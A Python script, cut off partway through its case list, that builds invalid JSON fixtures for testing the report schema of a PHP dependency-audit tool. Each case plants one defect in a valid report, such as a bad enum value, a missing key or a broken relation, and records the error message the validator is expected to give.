"""Negative fixtures for lockrot-report-2.schema.json: each is a valid generated report-2 document with ONE planted defect.

Each file carries `"$expect": {"strict": bool, "error": "<substring>"}`; validate.php --expect-invalid removes the key,
validates (the strict twin when asked) and passes the fixture only when an error message names the substring, so a
fixture rejected for some other reason than the one planted does not count.

Usage: python3 make_negatives.py   ->  negative/report-2/NN-<name>.json  (and a first pass asserting each base is valid is
validate.php's job on r3/docs/)
"""
import json, os, copy, glob

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.normpath(os.path.join(HERE, '..', '..'))
DOCS = os.path.join(REPO, 'tests', 'fixtures', 'schema', 'documents', 'cases')
OUT = os.path.join(REPO, 'tests', 'fixtures', 'schema', 'negative', 'report-2')


def load(name):
    return json.load(open(os.path.join(DOCS, name + '.json')))


COMPOSITE = load('composite')
IDX = {o['package']: i for i, o in enumerate(COMPOSITE['findings'])}
TWIG, MONO, DEBUG, OAUTH, CSSMIN, YAML, POLY = (IDX[p] for p in ('twig/twig', 'symfony/monolog-bridge', 'symfony/debug',
                                                               'friendsofsymfony/oauth-server-bundle', 'tubalmartin/cssmin',
                                                               'symfony/yaml', 'symfony/polyfill-intl-idn'))


def sig(o, sid):
    return next(s for s in o['signals'] if s['id'] == sid)


def term(o, part):
    return next(t for t in o['score']['terms'] if t['part'] == part)


def rule(doc, rid):
    return next(r for r in doc['run']['score_model']['rules'] if r['id'] == rid)


def F(i):
    return lambda d: d['findings'][i]


CASES = []  # (name, base, mutate, error substring, strict)


def case(name, base, error, strict=False):
    def wrap(fn):
        CASES.append((name, base, fn, error, strict))
        return fn
    return wrap


m = MONO
f = 'findings[%d]' % m
# ---------------------------------------------------------------------------------------------- closed sets (§8.2)
@case('verdict-cause-word', 'composite', f + '.verdict')
def _(d): d['findings'][m]['verdict'] = 'left-behind'  # 0.13's cause word: report-2's verdict is a grade
@case('lead-vulnerable', 'composite', 'findings[%d].lead' % TWIG)
def _(d): d['findings'][TWIG]['lead'] = 'vulnerable'  # lead is a maintenance flag or null
@case('reach-unknown-value', 'composite', f + '.reach')
def _(d): d['findings'][m]['reach'] = 'indirect'
@case('flag-id-archived', 'composite', 'findings[%d].flags[0].id' % DEBUG)
def _(d): d['findings'][DEBUG]['flags'][0]['id'] = 'archived'  # S3 is a degree of abandoned, not a flag (§2.2)
@case('headline-unit-days', 'composite', f + '.flags[0].headline.unit')
def _(d): d['findings'][m]['flags'][0]['headline']['unit'] = 'days'
@case('headline-source-commit', 'composite', f + '.flags[0].headline.source')
def _(d): d['findings'][m]['flags'][0]['headline']['source'] = 'commit'
@case('term-part-unknown', 'composite', f + '.score.terms[0].part: Does not have a value')
def _(d): d['findings'][m]['score']['terms'][0]['part'] = 'liveness'  # the discriminator is closed
@case('without-remove-kind-signal', 'composite', f + '.score.without[0].remove.kind: Does not have a value')
def _(d): d['findings'][m]['score']['without'][0]['remove']['kind'] = 'signal'
@case('composer-moves-because-unknown', 'composite', f + '.next_step.composer_moves_because[0]')
def _(d): d['findings'][m]['next_step']['composer_moves_because'] = ['holder']
@case('raise-size-huge', 'composite', 'findings[%d].next_step.php_check.raise_size' % TWIG)
def _(d): d['findings'][TWIG]['next_step']['php_check']['raise_size'] = 'huge'
@case('held-by-source-dependency', 'composite', 'findings[%d].next_step.held_by[1].source' % TWIG)
def _(d): d['findings'][TWIG]['next_step']['held_by'][1]['source'] = 'dependency'
@case('held-by-link-suggest', 'composite', 'findings[%d].next_step.held_by[0].link' % TWIG)
def _(d): d['findings'][TWIG]['next_step']['held_by'][0]['link'] = 'suggest'
@case('security-status-ignored', 'composite', 'findings[%d].security.status' % POLY)
def _(d): d['findings'][POLY]['security']['status'] = 'ignored'
@case('security-worst-moderate', 'composite', f + '.security.worst')
def _(d): d['findings'][m]['security']['worst'] = 'moderate'  # Composer's raw word; the bucket is medium (§5.2)
@case('metadata-status-missing', 'composite', f + '.metadata.status')
def _(d): d['findings'][m]['metadata']['status'] = 'missing'
@case('allowlist-by-user', 'composite', 'findings[%d].allowlist.by: Does not have a value' % POLY)
def _(d): d['findings'][POLY]['allowlist']['by'] = 'user'
@case('allowlist-reason-by-project', 'composite', 'findings[%d].allowlist.reason_by: Does not have a value' % POLY)
def _(d): d['findings'][POLY]['allowlist']['reason_by'] = 'project'
@case('baseline-status-accepted', 'B-baselined-dagger', 'findings[0].baseline.status: Does not have a value')
def _(d): d['findings'][0]['baseline']['status'] = 'accepted'  # the baseline's word is known (round 3)
@case('gate-limited-by-new', 'B-baselined-dagger', 'findings[0].gate.basis.limited_by: Does not have a value')
def _(d): d['findings'][0]['gate']['basis']['limited_by'] = 'new'
@case('target-php-source-composer', 'composite', 'run.target_php_source')
def _(d): d['run']['target_php_source'] = 'composer'
@case('fail-on-source-cli', 'composite', 'run.fail_on_source')
def _(d): d['run']['fail_on_source'] = 'cli'
@case('s1-marked-by-registry', 'composite', 'data.marked_by: Does not have a value')
def _(d): sig(d['findings'][DEBUG], 'S1')['data']['marked_by'] = 'registry'
@case('s7-verdict-cause-word', 'composite', 'data.packages[0].verdict: Does not have a value')
def _(d): sig(d['findings'][OAUTH], 'S7')['data']['packages'][0]['verdict'] = 'stale'  # report-2: the grade
@case('accepted-vulnerable', 'psr-log', 'findings[0].score.accepted[0].flag: Does not have a value')
def _(d): d['findings'][0]['score']['accepted'][0]['flag'] = 'vulnerable'  # the allowlist accepts maintenance flags only (§6.5)
@case('envelope-schema-1', 'composite', 'lockrot.schema')
def _(d): d['lockrot']['schema'] = 1
@case('schema-url-report-1', 'composite', '$schema')
def _(d): d['$schema'] = 'https://lockrot.dev/schema/report-1.json'
@case('priority-urgent', 'composite', f + '.priority')
def _(d): d['findings'][m]['priority'] = 'urgent'
@case('root-flags-vulnerable-leading', 'composite', 'flags.vulnerable.leading')
def _(d): d['flags']['vulnerable']['leading'] = 3  # vulnerable is never a lead

# ---------------------------------------------------------------------------------------------- required keys (every key always written)
@case('missing-next-step', 'composite', f + '.next_step')
def _(d): d['findings'][m]['do'] = d['findings'][m].pop('next_step')  # revision 2's name
@case('missing-score-band', 'composite', f + '.score.band: The property band is required')
def _(d): del d['findings'][m]['score']['band']
@case('term-without-contribution', 'composite', f + '.score.terms[0].contribution: The property contribution is required')
def _(d): del d['findings'][m]['score']['terms'][0]['contribution']
@case('security-term-without-advisory', 'composite', f + '.score.terms[2].advisory: The property advisory is required')
def _(d): del term(d['findings'][m], 'security')['advisory']
@case('vulnerable-without-installed-branch-fixes', 'composite', f + '.security.installed_branch_fixes: The property installed_branch_fixes is required')
def _(d): del d['findings'][m]['security']['installed_branch_fixes']
@case('counts-without-finished', 'composite', 'counts.finished')
def _(d): del d['counts']['finished']
@case('counts-report-1', 'composite', 'counts.critical')
def _(d): d['counts'] = {k: 0 for k in ['abandoned', 'silent', 'pinned', 'left-behind', 'old-promise', 'stale', 'unknown', 'finished', 'ok']}
@case('s8-without-reachable-admits', 'composite', 'data.reachable_admits: The property reachable_admits is required')
def _(d): del sig(d['findings'][m], 'S8')['data']['reachable_admits']
@case('s10-without-blocks', 'ok-unchecked', 'data.blocks: The property blocks is required')
def _(d): del sig(d['findings'][0], 'S10')['data']['blocks']  # the critic round's defect (5.CR1)
@case('s7-flags-not-flag-ids', 'composite', 'flag_ids: The property flag_ids is required')
def _(d):
    p = sig(d['findings'][OAUTH], 'S7')['data']['packages'][0]
    p['flags'] = p.pop('flag_ids')  # every list of bare flag ids is flag_ids (§8.2)
@case('run-without-score-model', 'composite', 'run.score_model')
def _(d): d['run']['score_model_id'] = d['run'].pop('score_model')['id']  # round 3's case runs (4.C5)
@case('rule-divide-without-by', 'composite', 'rules[6].by: The property by is required')
def _(d): del rule(d, 'divide-reach')['by']  # a page renders an unknown rule's arithmetic from its kind's parameters

# ---------------------------------------------------------------------------------------------- one name, one type
@case('score-total-not-integer', 'composite', f + '.score.total: Double value found, but an integer is required')
def _(d): d['findings'][m]['score']['total'] = 36.5
@case('score-total-string', 'composite', f + '.score.total: String value found, but an integer is required')
def _(d): d['findings'][m]['score']['total'] = '36'
@case('score-exact-quarter', 'composite', f + '.score.exact: Must be a multiple of 0.5')
def _(d): d['findings'][m]['score']['exact'] = 36.25  # half points only (multipleOf 0.5)
@case('band-to-next-half', 'composite', 'findings[%d].score.band.to_next: Double value found' % CSSMIN)
def _(d): d['findings'][CSSMIN]['score']['band']['to_next'] = 13.5  # to_next is measured from total, an integer (round 2)
@case('modifier-divide-by-string', 'composite', 'findings[%d].score.modifiers[0].divide_by: String value found' % POLY)
def _(d): d['findings'][POLY]['score']['modifiers'][0]['divide_by'] = '2'
@case('commands-as-strings', 'composite', f + '.next_step.commands[0]')
def _(d): d['findings'][m]['next_step']['commands'] = ['composer require symfony/monolog-bridge:^5.4.52']  # argv lists (round 4)
@case('s9-fix-as-string', 'composite', 'advisories[0].fix: String value found, but an object is required')
def _(d): sig(d['findings'][m], 'S9')['data']['advisories'][0]['fix'] = 'upgrade'  # fix is always the object, fix_kind the string
@case('score-model-id-string', 'composite', 'run.score_model.id')
def _(d): d['run']['score_model']['id'] = '1'
@case('rules-used-string', 'composite', 'run.score_rules_used.band-floors')
def _(d): d['run']['score_rules_used']['band-floors'] = '7'
@case('ignored-count-string', 'composite', 'findings[%d].security.ignored_count: String value found' % YAML)
def _(d): d['findings'][YAML]['security']['ignored_count'] = '0'
@case('headline-php-string', 'composite', f + '.flags[1].headline.value: String value found, but an integer is required')
def _(d): d['findings'][m]['flags'][1]['headline']['value'] = '5'  # unit php: an integer major

# ---------------------------------------------------------------------------------------------- shapes and discriminators
@case('score-zero-with-terms', 'psr-log', 'findings[0].score: Matched a schema which it should not')
def _(d): d['findings'][0]['score']['terms'] = []  # 'terms' in score is the discriminator
@case('score-zero-shape-nonzero-total', 'psr-log', 'findings[0].score.total: Does not have a value in the enumeration [0]')
def _(d): d['findings'][0]['score']['total'] = 3
@case('security-clear-on-partial-lookup', 'composite', 'findings[%d].security.check: Does not have a value in the enumeration ["complete"]' % DEBUG)
def _(d):
    s = d['findings'][DEBUG]['security']
    s['check'], s['complete'] = 'partial', False  # clear only on a complete lookup (I21, round 4)
@case('abandoned-without-degree', 'composite', 'findings[%d].flags[0].degree: NULL value found' % DEBUG)
def _(d): d['findings'][DEBUG]['flags'][0]['degree'] = None  # abandoned carries {reasons, liveness_complete}
@case('gate-by-without-facts', 'composite', f + '.gate.by[0].facts')
def _(d): d['findings'][m]['gate']['by'][0]['facts'] = []  # a failing value names at least one fact (I15b)
@case('checks-skipped-without-blocks', 'composite', 'findings[%d].checks_skipped[0].blocks' % POLY)
def _(d): d['findings'][POLY]['checks_skipped'][0]['blocks'] = []

# ---------------------------------------------------------------------------------------------- open sets: malformed, or unknown under the strict twin
@case('fail-on-not-canonical', 'composite', 'run.fail_on')
def _(d): d['run']['fail_on'] = 'High, vulnerable-high'  # canonical: lower case, no spaces (§6.1)
@case('rule-id-malformed', 'composite', 'rules[6].id: Does not match the regex pattern')
def _(d): rule(d, 'divide-reach')['id'] = 'Divide Reach'
@case('next-step-kind-malformed', 'composite', f + '.next_step.kind')
def _(d): d['findings'][m]['next_step']['kind'] = 'Require'
@case('gate-value-uppercase', 'composite', f + '.gate.by[0].value')
def _(d): d['findings'][m]['gate']['by'][0]['value'] = 'HIGH'
@case('strict-rule-id-unknown', 'composite', 'rules[6].id: Does not have a value in the enumeration', strict=True)
def _(d): rule(d, 'divide-reach')['id'] = 'divide-reachx'  # well-formed: the published schema takes it, the strict twin does not
@case('strict-move-kind-unknown', 'composite', f + '.next_step.kind', strict=True)
def _(d): d['findings'][m]['next_step']['kind'] = 'upgrade-major'
@case('strict-flag-weight-revision-2', 'composite', f + '.flags[0]: The property weight is not defined', strict=True)
def _(d): d['findings'][m]['flags'][0].update(weight=16, points=16)  # revision 2 had both on flags[]; terms[] holds them now
@case('strict-security-summary', 'composite', 'The property summary is not defined', strict=True)
def _(d): d['findings'][m]['security']['summary'] = 'dropped in round 2'
@case('strict-divisor-three', 'composite', f + '.score.terms[1].divisor: Does not have a value in the enumeration', strict=True)
def _(d):  # model 1's divisors are 1 and 4 (x-known-values); attack round 3: a later divisor comes with a later model id (§3.7)
    d['findings'][m]['score']['terms'][1]['divisor'] = 3
    d['findings'][m]['score']['model'] = 2

# ---------------------------------------------------------------------------------------------- schema round
@case('clears-kind-signal', 'composite', f + '.next_step.clears[0].kind: Does not have a value')
def _(d): d['findings'][m]['next_step']['clears'][0]['kind'] = 'signal'  # fact kinds are closed (§8.2, schema round)
@case('worsened-by-kind-check', 'B-baselined-dagger', 'findings[0].baseline.worsened_by[0].kind: Does not have a value')
def _(d): d['findings'][0]['baseline']['worsened_by'][0]['kind'] = 'check'
@case('move-in-security', 'composite', f + '.security.move_in')
def _(d): d['findings'][m]['security']['move_in'] = 'security'  # closed: it points into the document
@case('ignored-by-malformed', 'E-ignored-dagger', 'findings[0].security.ignored[0].by: Does not match the regex pattern')
def _(d): d['findings'][0]['security']['ignored'][0]['by'] = 'Audit Ignore'
@case('ignored-matched-the-value', 'E-ignored-dagger', 'findings[0].security.ignored[0].matched: Does not match the regex pattern')
def _(d): d['findings'][0]['security']['ignored'][0]['matched'] = 'PKSA-ign0-0000-0000'  # revision 3's IGN fixture: the value, not what it matched on
@case('ignored-severity-moderate', 'E-ignored-dagger', 'findings[0].security.ignored[0].severity: Does not have a value')
def _(d): d['findings'][0]['security']['ignored'][0]['severity'] = 'moderate'  # the bucket (§5.2)
@case('points-from-missing', 'composite', 'run.score_model.flags[0].points_from: The property points_from is required')
def _(d): del d['run']['score_model']['flags'][0]['points_from']  # every row writes every key (schema round)
@case('rank-null', 'composite', f + '.rank: NULL value found')
def _(d): d['findings'][m]['rank'] = None  # an int >= 1 in every report (18 fixture variants wrote null)
@case('strict-ignored-by-config-prefix', 'E-ignored-dagger', 'findings[0].security.ignored[0].by: Does not have a value in the enumeration', strict=True)
def _(d): d['findings'][0]['security']['ignored'][0]['by'] = 'config.audit.ignore'  # well-formed, not one of SPEC.md §4.1's names

@case('gates-hold-none', 'composite', 'run.gates[0]')
def _(d): d['run']['gates'] = [{'value': 'none', 'kind': 'grade', 'threshold': None}]  # --fail-on=none writes gates: [] (§6.1, schema round)


# ---------------------------------------------------------------------------------------------- relations (§8.2 "What the schemas check"; schema round)
@case('relation-priority-not-the-grade', 'composite', f + '.priority: Does not have a value in the enumeration ["critical"]')
def _(d): d['findings'][m]['priority'] = 'high'  # the alias equals the grade
@case('relation-judged-without-metadata', 'composite', f + '.maintenance_judged: Does not have a value in the enumeration [false]')
def _(d): d['findings'][m]['metadata']['status'] = 'not_from_composer_repository'  # maintenance_judged <=> metadata read
@case('relation-reach-against-direct', 'composite', f + '.reach: Does not have a value in the enumeration ["direct"]')
def _(d): d['findings'][m]['reach'] = 'transitive'
@case('relation-reason-on-a-require-move', 'composite', f + '.next_step.reason: String value found, but a null is required')
def _(d): d['findings'][m]['next_step']['reason'] = 'package_quiet'  # reason only on no-move
@case('relation-clears-all-false-with-nothing-left', 'composite', f + '.next_step.clears_all: Does not have a value in the enumeration [true]')
def _(d): d['findings'][m]['next_step']['clears_all'] = False
@case('relation-builtin-entry-without-reason-id', 'composite', 'findings[%d].allowlist.reason_id: NULL value found, but a string is required' % POLY)
def _(d): d['findings'][POLY]['allowlist']['reason_id'] = None  # a lockrot-authored reason has an id (§6.5)


# ---------------------------------------------------------------------------------------------- attack round 1
# each documents a rule report-2 now holds that only explain-2 held, or that neither held (forbidden documents both accepted)
@case('a1-headline-years-value-without-source', 'composite', f + '.flags[0]')
def _(d): d['findings'][m]['flags'][0]['headline']['source'] = None  # a years value always names its reading (§7.6)
@case('a1-flag-vulnerable-years-headline', 'composite', f + '.flags[2]')
def _(d): d['findings'][m]['flags'][2]['headline'] = {'unit': 'years', 'value': 10.9, 'source': 'release'}  # vulnerable's unit is advisories
@case('a1-flag-old-promise-years-headline', 'composite', f + '.flags[1]')
def _(d): d['findings'][m]['flags'][1]['headline'] = {'unit': 'years', 'value': 10.9, 'source': 'release'}  # old-promise's unit is php
@case('a1-flags-identical-copy', 'composite', f + '.flags: There are no duplicates allowed')
def _(d): d['findings'][m]['flags'].insert(1, copy.deepcopy(d['findings'][m]['flags'][0]))  # uniqueItems catches an identical copy only (attack round 2: "each flag once" is ScoreContractTest's)
@case('a1-flag-signals-empty', 'composite', f + '.flags[0].signal_ids: There must be a minimum of 1 items')
def _(d): d['findings'][m]['flags'][0]['signal_ids'] = []
@case('a1-without-total-0-graded', 'composite', f + '.score')
def _(d): d['findings'][m]['score']['without'][0].update(total=0, verdict='high')  # a rerun at 0 reads a score-0 word
@case('a1-if-counted-total-0', 'D-partial-dagger', 'findings[0].score')
def _(d): d['findings'][0]['score']['accepted'][0]['if_counted'].update(total=0, verdict='high')
@case('a1-exact-below-1-on-the-graded-shape', 'composite', f + '.score')
def _(d): d['findings'][m]['score']['exact'] = 0.5
@case('a1-gate-threshold-null-on-a-grade', 'composite', 'run.gates[0]')
def _(d): d['run']['gates'][0]['threshold'] = None  # null exactly for unchecked (§6.1)
@case('a1-gate-kind-hyphen', 'composite', 'run.gates[0].kind: Does not match the regex pattern')
def _(d): d['run']['gates'][0]['kind'] = 'abandoned-since'  # gate kinds are reason-like: underscores (§8.2)
@case('a1-allowlist-project-pattern-null', 'D-partial-dagger', 'findings[0].allowlist')
def _(d): d['findings'][0]['allowlist']['pattern'] = None  # null exactly on a type entry (§6.5)
@case('a1-recorded-flags-vulnerable', 'C-baselined-dagger', 'findings[0].baseline')
def _(d): d['findings'][0]['baseline']['recorded']['flags']['vulnerable'] = {'known_since': None}  # a baseline stores maintenance flags only
@case('a1-recorded-flags-empty-map', 'C-baselined-dagger', 'findings[0].baseline')
def _(d): d['findings'][0]['baseline']['recorded']['flags'] = {}  # an entry with no flag writes null, never {}
@case('a1-replacement-url-not-http', 'composite', 'findings[%d].signals[0].data' % DEBUG)
def _(d): sig(d['findings'][DEBUG], 'S1')['data']['replacement_url'] = 'ftp://packagist.org/packages/symfony/error-handler'
@case('a1-held-by-constraint-empty', 'composite', 'findings[%d].next_step.held_by[0].constraint' % TWIG)
def _(d): d['findings'][TWIG]['next_step']['held_by'][0]['constraint'] = ''
# open sets stay open as published (each strict-only: published valid, the strict twin rejects the unknown value)
@case('strict-a1-security-status-later-value', 'composite', 'score.parts.security.status', strict=True)
def _(d): d['findings'][m]['score']['parts']['security']['status'] = 'estimated'  # a later status for a counted advisory (§8.2)
@case('strict-a1-gate-kind-later-value', 'composite', 'run.gates[0].kind', strict=True)
def _(d): d['run']['gates'][0].update(kind='abandoned_since')
@case('strict-a1-checks-skipped-check-releases', 'scope-registries-dagger', 'findings[0].checks_skipped[0].check', strict=True)
def _(d): d['findings'][0]['checks_skipped'][0]['check'] = 'releases'  # an S10 check id, not one checks_skipped writes
@case('strict-a1-reason-id-misspelt', 'composite', 'findings[%d].allowlist.reason_id' % POLY, strict=True)
def _(d): d['findings'][POLY]['allowlist']['reason_id'] = 'php-fig-extra'



# ---------------------------------------------------------------------------------------------- attack round 2
# each plants one rule §8.2 had filed as engine-only or left out, now a relation of report-2 (and of explain-2, which copies it)
@case('a2-vulnerable-status-without-flag', 'composite', f)
def _(d): d['findings'][m]['flags'] = [x for x in d['findings'][m]['flags'] if x['id'] != 'vulnerable']
@case('a2-vulnerable-flag-on-a-clear-finding', 'composite', 'findings[%d]' % DEBUG)
def _(d): d['findings'][DEBUG]['flags'].append(copy.deepcopy(next(x for x in d['findings'][m]['flags'] if x['id'] == 'vulnerable')))
@case('a2-lead-not-the-first-term', 'composite', f)
def _(d): d['findings'][m]['lead'] = 'old-promise'  # the first term is left-behind
@case('a2-verdict-not-the-band-of-total', 'composite', f)
def _(d): d['findings'][m]['score'].update(total=20, exact=20, rounded_down=False)  # critical needs 32 under model 1
@case('a2-band-floor-of-another-grade', 'composite', f + '.score.band')
def _(d): d['findings'][m]['score']['band']['floor'] = 8  # 8's next band is high, not null
@case('a2-to-next-zero', 'composite', 'findings[%d].score.band.to_next' % POLY)
def _(d): d['findings'][POLY]['score']['band']['to_next'] = 0
@case('a2-dev-false-with-a-dev-modifier', 'composite', f)
def _(d): d['findings'][m]['score']['modifiers'].append(dict(reason='dev', applies_to='total', divide_by=2, before=36, after=18))
@case('a2-direct-with-a-reach-modifier', 'composite', f)
def _(d): d['findings'][m]['score']['modifiers'].append(dict(reason='transitive', applies_to='maintenance', divide_by=2, before=20, after=10))
@case('a2-dev-modifier-on-maintenance', 'B-dev-dagger', 'findings[0].score.modifiers')
def _(d): next(x for x in d['findings'][0]['score']['modifiers'] if x['reason'] == 'dev')['applies_to'] = 'maintenance'
@case('a2-allowlist-reason-without-whole-entry', 'D-partial-dagger', 'findings[0]')
def _(d): d['findings'][0]['allowlist_reason'] = 'a single-file minifier, finished'  # a partial entry: report-1's key stays null
@case('a2-accepted-flag-without-an-entry', 'composite', f)
def _(d): next(x for x in d['findings'][m]['flags'] if x['id'] == 'old-promise')['role'] = 'accepted'
@case('a2-exempt-by-baseline-without-an-entry', 'composite', f)
def _(d): d['findings'][m]['gate'].update(fails=False, by=[], exempt_by='baseline')
@case('a2-gate-basis-without-an-entry', 'composite', f)
def _(d):
    t = d['findings'][m]['score']
    d['findings'][m]['gate']['basis'] = dict(score=36, verdict='critical', cap=72, limited_by='score',
                                             new=dict(total=36, exact=36, rounded_down=False, terms=copy.deepcopy(t['terms']), modifiers=[]))
@case('a2-score-0-standing-new', 'baseline-read-score0', 'findings[0]')
def _(d):
    d['findings'][0]['baseline'] = dict(status='new', recorded=None, advisories_now=dict(known=0, new=0, re_rated=0, fix_lost=0), worsened_by=[])
    d['baseline']['new'] = 1
@case('a2-security-part-unchecked-on-a-complete-lookup', 'composite', 'findings[%d]' % DEBUG)
def _(d): d['findings'][DEBUG]['score']['parts']['security']['status'] = 'unchecked'
@case('a2-security-counted-of-zero', 'composite', f + '.score')
def _(d): d['findings'][m]['score']['parts']['security']['of'] = 0
@case('a2-maintenance-counted-without-a-term', 'composite', 'findings[%d].score' % TWIG)
def _(d): d['findings'][TWIG]['score']['parts']['maintenance'].update(status='counted', contribution=8, alone=dict(total=8, verdict='medium'))
@case('a2-rounded-down-false-on-a-half', 'rounded-dev-dagger', 'findings[0].score')
def _(d): d['findings'][0]['score']['rounded_down'] = False
@case('a2-rounded-down-true-on-a-whole', 'composite', f + '.score')
def _(d): d['findings'][m]['score']['rounded_down'] = True
@case('a2-multiplier-2-on-an-upgrade-fix', 'composite', f + '.score')
def _(d): term(d['findings'][m], 'security').update(multiplier=2, points=32)
@case('a2-first-term-corroborating', 'composite', f + '.score')
def _(d): d['findings'][m]['score']['terms'][0].update(role='corroborating', divisor=4, points=4)
@case('a2-merged-vulnerable-without-fix-kind', 'composite', f + '.next_step')
def _(d): d['findings'][m]['next_step']['fix_kind'] = None  # `merged` holds vulnerable
@case('a2-move-in-also-without-also', 'composite', f)
def _(d): d['findings'][m]['security']['move_in'] = 'also'
@case('a2-without-advisory-row-reveals', 'composite', f + '.score.without')
def _(d): d['findings'][m]['score']['without'].append(dict(remove=dict(kind='advisory', id='X'), revealed=[dict(flag='silent', role='lead')], total=1, verdict='low',
                                                            lead=None, deciding_advisory=None, at_least=False))
@case('a2-not-from-composer-repository-but-read', 'composite', f)
def _(d): d['findings'][m]['from_composer_repository'] = False
@case('a2-root-baseline-null-beside-a-standing', 'B-baselined-dagger', '(root)')
def _(d): d['baseline'] = None
@case('a2-include-dev-differs-from-run', 'composite', '(root)')
def _(d): d['include_dev'] = True
@case('a2-fail-on-none-with-a-gate', 'composite', 'run')
def _(d): d['run']['fail_on'] = 'none'
@case('a2-grade-value-of-kind-flag', 'composite', 'run.gates[0]')
def _(d): d['run']['gates'][0]['kind'] = 'flag'
@case('a2-score-rules-used-misspelt-key', 'composite', 'run.score_rules_used')
def _(d): u = d['run']['score_rules_used']; u['corroborating_share'] = u.pop('corroborating-share')
@case('a2-score-rules-used-count-on-sort', 'composite', 'run.score_rules_used.sort')
def _(d): d['run']['score_rules_used']['sort'] = 7
@case('a2-partial-at-most-missing', 'partial-op-dagger', 'findings[0].security')
def _(d): del d['findings'][0]['security']['partial']['if_applied']['at_most']
@case('a2-recorded-fix-model-missing', 'A-baselined-dagger', 'findings[0].baseline')
def _(d): del d['findings'][0]['baseline']['recorded']['fix_model']
@case('a2-abandoned-with-suggestion-missing', 'composite', 'abandoned.with_suggestion')
def _(d): del d['abandoned']['with_suggestion']
@case('strict-a2-score-rules-used-later-key', 'composite', 'run.score_rules_used', strict=True)
def _(d): d['run']['score_rules_used']['split-reach'] = 0  # a well-formed later id: published valid, the strict twin's keys are model 1's
@case('strict-a2-reason-id-later', 'composite', 'findings[%d].allowlist.reason_id' % POLY, strict=True)
def _(d): d['findings'][POLY]['allowlist']['reason_id'] = 'symfony-later-polyfills'


# ---------------------------------------------------------------------------------------------- attack round 3
# each plants one rule the attack found accepted by the published and the strict schema although the spec forbids it
c_, e_ = DEBUG, YAML
fc = 'findings[%d]' % c_
@case('a3-zero-word-finished-without-entry', 'ok-unchecked', 'findings[0]')
def _(d): d['findings'][0]['verdict'] = 'finished'
@case('a3-zero-word-unknown-while-judged', 'ok-unchecked', 'findings[0]')
def _(d): d['findings'][0]['verdict'] = 'unknown'
@case('a3-zero-word-ok-not-judged', 'unknown', 'findings[0]')
def _(d): d['findings'][0]['verdict'] = 'ok'
@case('a3-zero-word-ok-beside-a-whole-entry', 'psr-log', 'findings[0]')
def _(d): d['findings'][0]['verdict'] = 'ok'
@case('a3-zero-word-unknown-beside-a-whole-entry', 'psr-log', 'findings[0]')
def _(d): d['findings'][0]['verdict'] = 'unknown'
@case('a3-without-row-not-the-band-of-its-total', 'composite', fc)
def _(d): d['findings'][c_]['score']['without'][0].update(total=36, verdict='low')
@case('a3-if-counted-not-the-band-of-its-total', 'psr-log', 'findings[0]')
def _(d): d['findings'][0]['score']['accepted'][0]['if_counted'].update(total=8, verdict='critical')
@case('a3-part-alone-not-the-band-of-its-total', 'composite', fc)
def _(d): d['findings'][c_]['score']['parts']['maintenance']['alone'].update(total=36, verdict='low')
@case('a3-if-applied-not-the-band-of-its-total', 'composite', f)
def _(d): d['findings'][m]['next_step']['if_applied'].update(total=20, verdict='low')
@case('a3-gate-basis-not-the-band-of-its-score', 'B-baselined-dagger', 'findings[0]')
def _(d): d['findings'][0]['gate']['basis']['verdict'] = 'low'
@case('a3-band-of-another-verdict', 'composite', fc)
def _(d): d['findings'][c_]['score']['band'] = dict(floor=16, next='critical', to_next=1)
@case('a3-to-next-not-from-total', 'composite', 'findings[%d]' % e_)
def _(d): d['findings'][e_]['score']['band']['to_next'] = 1  # low at 2 or 4: 8 - total, never 1
@case('a3-basis-new-rounded-down-on-a-whole', 'B-baselined-dagger', 'findings[0].gate.basis')
def _(d): d['findings'][0]['gate']['basis']['new']['rounded_down'] = True
@case('a3-basis-new-total-without-terms', 'B-baselined-dagger', 'findings[0].gate.basis')
def _(d): d['findings'][0]['gate']['basis']['new']['terms'] = []
@case('a3-run-fails-with-no-cause', 'composite', '(root)')
def _(d): d['gate']['tripped_by'] = []
@case('a3-fail-on-not-applied-beside-a-failing-finding', 'composite', '(root)')
def _(d): d['gate']['fail_on_applied'] = False
@case('a3-check-mode-without-fail-on-applied', 'composite-generate-baseline', '(root)')
def _(d): d['run']['mode'] = 'check'
@case('a3-tripped-by-fail-on-with-no-failing-finding', 'composite-generate-baseline', '(root)')
def _(d): d['gate'].update(tripped_by=['fail_on'], fails=True)
@case('a3-failing-zero-beside-a-failing-finding', 'composite', '(root)')
def _(d): d['gate']['failing'] = 0
@case('a3-reaching-not-exempt-not-failing-in-a-check-run', 'composite', '(root)')
def _(d):
    d['findings'][c_]['gate'].update(fails=False, by=[])
    d['gate']['failing'] -= 1
@case('a3-flag-baseline-without-a-standing', 'composite', fc)
def _(d): d['findings'][c_]['flags'][0]['baseline'] = dict(state='known', since='2026-01-01', covered_by=None)
@case('a3-s9-baseline-without-a-standing', 'composite', 'findings[%d]' % e_)
def _(d):
    for r in sig(d['findings'][e_], 'S9')['data']['advisories']:
        r['baseline'] = dict(state='known', since='2026-01-01', covered_by=None)
@case('a3-known-standing-with-new-advisories', 'C-baselined-dagger', 'findings[0].baseline')
def _(d): d['findings'][0]['baseline']['advisories_now']['new'] = 2
@case('strict-a3-security-term-role-lead', 'composite', 'findings[%d].score' % TWIG, strict=True)
def _(d): term(d['findings'][TWIG], 'security')['role'] = 'lead'
@case('strict-a3-maintenance-term-role-security', 'composite', fc + '.score', strict=True)
def _(d): d['findings'][c_]['score']['terms'][1]['role'] = 'security'
@case('a3-abandoned-weight-8', 'composite', fc + '.score')
def _(d): d['findings'][c_]['score']['terms'][0].update(weight=8)
@case('a3-corroborating-divisor-1', 'composite', fc + '.score')
def _(d): d['findings'][c_]['score']['terms'][1].update(divisor=1)
@case('a3-critical-security-weight-8', 'composite', 'findings[%d].score' % TWIG)
def _(d): term(d['findings'][TWIG], 'security').update(weight=8)
@case('a3-worst-low-beside-a-critical-count', 'composite', 'findings[%d].security' % TWIG)
def _(d): d['findings'][TWIG]['security']['worst'] = 'low'
@case('a3-s9-level-info-beside-worst-critical', 'composite', 'findings[%d]' % TWIG)
def _(d): sig(d['findings'][TWIG], 'S9')['level'] = 'info'
@case('a3-score-text-empty', 'composite', fc + '.score')
def _(d): d['findings'][c_]['score']['text'] = ''
@case('a3-move-text-empty', 'composite', fc + '.next_step.text')
def _(d): d['findings'][c_]['next_step']['text'] = ''
@case('a3-flag-summary-empty', 'composite', fc + '.flags[0].summary')
def _(d): d['findings'][c_]['flags'][0]['summary'] = ''
@case('a3-evidence-empty-on-a-graded-finding', 'composite', fc)
